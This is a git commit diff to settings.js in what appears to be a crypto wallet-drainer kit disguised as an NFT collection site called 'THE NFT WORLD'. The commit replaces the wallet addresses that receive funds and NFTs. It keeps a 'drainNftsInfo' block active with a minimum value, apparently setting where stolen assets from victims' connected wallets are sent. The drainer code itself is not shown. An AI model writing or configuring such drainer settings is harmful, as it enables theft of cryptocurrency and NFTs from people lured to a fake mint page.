8dfc88d4ce077829a33214376e98ba195d5b54a4
tensionlove <120292808+tensionlove@users.noreply.github.com>
2023-03-02 11:48:26 -0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0x7714d30c27ae2505ce25a0873d5900cd19c9ca51',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x7714d30c27ae2505ce25a0873d5900cd19c9ca51',
   },
 
   customStrings = {
